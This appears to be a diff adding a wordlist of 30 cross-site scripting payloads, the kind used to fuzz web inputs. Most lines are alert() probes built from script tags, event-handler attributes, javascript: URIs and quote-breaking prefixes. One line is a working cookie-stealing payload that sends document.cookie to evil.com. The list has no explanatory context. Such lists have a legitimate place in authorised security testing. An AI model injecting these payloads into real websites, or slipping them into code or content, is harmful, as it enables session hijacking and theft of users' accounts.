@@ -1,0 +1,30 @@
+<script>alert('XSS')</script>
+<script>alert(1)</script>
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=alert(1)>
+<svg onload=alert('XSS')>
+<svg/onload=alert(1)>
+<body onload=alert('XSS')>
+"><script>alert('XSS')</script>
+'><script>alert('XSS')</script>
+"><img src=x onerror=alert('XSS')>
+'><img src=x onerror=alert(1)>
+<iframe src="javascript:alert('XSS')">
+<input onfocus=alert('XSS') autofocus>
+<details open ontoggle=alert('XSS')>
+<marquee onstart=alert('XSS')>
+<select onfocus=alert('XSS') autofocus>
+<video><source onerror=alert('XSS')>
+<audio src=x onerror=alert('XSS')>
+javascript:alert('XSS')
+<a href="javascript:alert('XSS')">click</a>
+<div onmouseover=alert('XSS')>hover</div>
+<style>@import'javascript:alert("XSS")';</style>
+<table background="javascript:alert('XSS')">
+<object data="javascript:alert('XSS')">
+<embed src="javascript:alert('XSS')">
+'";!--<XSS>=&{()}
+<script>document.location='http://evil.com/?c='+document.cookie</script>
+<img """><script>alert("XSS")</script>">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
